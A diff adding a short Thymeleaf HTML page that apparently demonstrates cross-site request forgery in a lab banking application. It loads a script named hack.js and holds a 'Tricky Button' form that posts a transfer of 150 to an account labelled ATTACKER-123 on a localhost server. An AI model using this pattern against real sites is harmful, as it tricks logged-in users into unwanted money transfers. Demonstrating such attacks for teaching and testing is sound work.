@@ -1,0 +1,18 @@
+<!DOCTYPE HTML>
+<html xmlns:th="http://www.thymeleaf.org">
+
+	<head th:insert="fragments/fragments.html :: header"/>
+
+
+	<body>
+	
+	<div th:replace="fragments/fragments.html :: scripts"></div>
+	<script type="text/javascript" src="js/jquery.cookie.js"></script>
+	<script type="text/javascript" src="js/hack.js"></script>
+	
+	<form action="http://localhost:9090/transfert?noDebiteur=ATTACKER-123&montant=150" method="post">
+        <input type="submit" value="Tricky Button">
+    </form>
+	</body>
+	
+</html>
